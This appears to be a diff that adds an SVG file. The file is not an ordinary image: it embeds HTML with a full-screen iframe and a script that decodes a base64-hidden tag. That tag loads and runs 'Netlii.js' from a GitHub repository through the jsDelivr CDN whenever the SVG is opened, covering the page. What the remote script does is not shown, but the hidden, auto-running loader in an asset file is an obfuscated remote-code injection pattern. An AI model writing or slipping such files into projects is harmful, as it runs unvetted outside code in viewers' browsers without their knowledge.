@@ -1,0 +1,12 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" style="position: fixed; top: 0; left: 0;">
+<style>[...]</style>
+  <foreignObject x="0" y="0" width="100%" height="100%">
+    <body xmlns="http://www.w3.org/1999/xhtml">
+    <meta content='width=device-width, initial-scale=1.0' name='viewport'></meta>
+	 <iframe style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;" id="test"></iframe>
+         <script>let l = atob("PHNjcmlwdCBzcmM9Imh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC9idWJiZXJnYW1lc2l0ZXMvZ3JhZ2dsZUBtYWluL05ldGxpaS5qcyI+PC9zY3JpcHQ+"); var theIframe = document.getElementById('test'); theIframe.srcdoc = l;</script>
+    </body>
+  </foreignObject>
+      <script><![CDATA[...]]></script>
+</svg>
+
